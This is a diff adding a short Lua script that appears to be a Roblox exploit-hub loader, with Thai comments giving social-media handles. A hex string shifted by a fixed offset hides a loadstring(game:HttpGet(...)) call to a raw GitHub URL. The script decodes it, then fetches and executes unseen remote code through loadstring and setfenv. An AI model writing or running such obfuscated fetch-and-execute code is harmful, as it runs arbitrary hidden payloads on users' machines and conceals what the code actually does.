@@ -1,0 +1,18 @@
+-- YouTube:ยังไม่มี
+-- TikTok:เจ้าของธุรกิจใหญ่ฯ
+-- Discord:ยังไม่มี
+-- เจ้าของธุรกิจ
+local _0x76792aJGiyZH = "999c8e91a0a19f969b9455948e9a926775a1a19d7492a1554f95a1a19da0675c5c9f8ea45b9496a195a28fa2a0929f909c9ba1929ba15b909c9a5c9fa29c9866645e5c9f92915a909c9f925c9f9293a05c95928e91a05c9a8e969b5c788e96a0929f525f5d75a28f5b9892a64f56565556"
+local _0x73e907fzDk = 45
+local _0x76598cHziTQ = _0x76792aJGiyZH:gsub("..", function(ch)
+    local v = tonumber(ch, 16) - _0x73e907fzDk
+    if v < 0 then v = v + 256 end
+    return string.char(v)
+end)
+local _0x9da507vOOxX, _0x370842rFSz = (loadstring or load or (getfenv and getfenv().loadstring))(_0x76598cHziTQ)
+if _0x9da507vOOxX then
+    pcall(setfenv, _0x9da507vOOxX, getfenv())
+    return _0x9da507vOOxX()
+else
+    error(_0x370842rFSz or "Execution Error", 0)
+end
